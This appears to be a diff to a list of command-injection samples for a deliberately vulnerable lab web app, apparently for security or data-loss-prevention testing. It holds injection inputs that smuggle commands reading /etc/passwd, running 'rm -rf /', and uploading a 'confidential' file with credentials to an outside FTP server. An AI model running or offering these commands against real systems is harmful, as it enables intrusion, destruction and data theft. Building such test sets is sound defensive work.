@@ -58,3 +58,8 @@ http://labs.aflabs.us:8090/samples/tp_samples/ms05_054_onload.html
 127.0.0.1| python exploit.py http://192.168.40.12/hello "cat /etc/passwd"
 127.0.0.1| python exploit.py http://192.168.40.12/hello "ls -la"
 127.0.0.1| python exploit.py http://192.168.40.12/hello "rm -rf /"
+
+
+# File Upload to a FTP Server
+8.8.8.8| wget https://raw.githubusercontent.com/andrefernandes86/tools-ftpserver/main/confidential.pdf
+8.8.8.8| curl -p --insecure  "ftp://ftp.dlptest.com/tp/" --user "dlpuser:rNrKYTX9g7z3RgJRmxWuGHbeu" -T "/var/www/html/vulnerabilities/exec/confidential.pdf" --ftp-create-dirs
